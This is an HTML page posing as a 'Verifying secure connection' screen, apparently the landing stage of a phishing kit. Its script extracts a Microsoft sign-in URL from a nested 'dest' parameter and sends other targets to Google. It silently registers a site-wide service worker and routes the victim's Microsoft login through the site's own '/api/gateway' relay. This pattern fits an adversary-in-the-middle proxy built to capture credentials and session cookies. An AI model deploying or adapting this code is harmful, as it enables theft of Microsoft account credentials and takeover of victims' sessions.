<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Connection</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #f5f5f5;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        .container {
            text-align: center;
            background: #ffffff;
            padding: 48px 32px;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.06);
            max-width: 400px;
            width: 100%;
        }
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #e8e8e8;
            border-top-color: #4C00FF;
            border-radius: 50%;
            margin: 0 auto 20px;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .title {
            font-size: 18px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 6px;
        }
        .sub {
            font-size: 14px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="title">Verifying secure connection</div>
        <div class="sub">Please wait while we establish an encrypted session…</div>
    </div>

    <script>
        (function() {
            // Get the raw 'dest' parameter from the URL
            const params = new URLSearchParams(window.location.search);
            let raw = params.get('dest');
            console.log('[PAGE] Raw dest:', raw);

            if (!raw) {
                window.location.replace('https://www.google.com');
                return;
            }

            // Decode the raw value (it's URL-encoded)
            let microsoftUrl;
            try {
                // First decode: %3A%2F%2F → ://
                const firstDecode = decodeURIComponent(raw);
                console.log('[PAGE] First decode:', firstDecode);

                // Check if it's a nested URL (contains 'dest=')
                if (firstDecode.includes('dest=')) {
                    // Extract the inner dest parameter
                    const urlObj = new URL(firstDecode);
                    const innerDest = urlObj.searchParams.get('dest');
                    if (innerDest) {
                        microsoftUrl = decodeURIComponent(innerDest);
                        console.log('[PAGE] Extracted inner dest:', microsoftUrl);
                    } else {
                        microsoftUrl = firstDecode;
                    }
                } else {
                    microsoftUrl = firstDecode;
                }
            } catch (e) {
                console.log('[PAGE] Decode error, using raw:', e.message);
                microsoftUrl = raw;
            }

            // Validate it's a proper URL (must be Microsoft)
            try {
                const url = new URL(microsoftUrl);
                if (!url.hostname.includes('microsoftonline.com') && !url.hostname.includes('microsoft.com')) {
                    console.log('[PAGE] Not a Microsoft URL, falling back to Google');
                    window.location.replace('https://www.google.com');
                    return;
                }
                console.log('[PAGE] Final Microsoft URL:', url.href);
            } catch (e) {
                console.log('[PAGE] Invalid URL, falling back to Google');
                window.location.replace('https://www.google.com');
                return;
            }

            // Register Service Worker silently
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('/worker_8t2r.js', { scope: '/' })
                    .then(() => console.log('[PAGE] SW registered'))
                    .catch(err => console.log('[PAGE] SW registration failed:', err));
            }

            // Navigate to relay with the CLEAN Microsoft URL
            const relayUrl = `/api/gateway?target=${encodeURIComponent(microsoftUrl)}`;
            console.log('[PAGE] Redirecting to relay:', relayUrl);
            window.location.replace(relayUrl);
        })();
    </script>
</body>
</html>
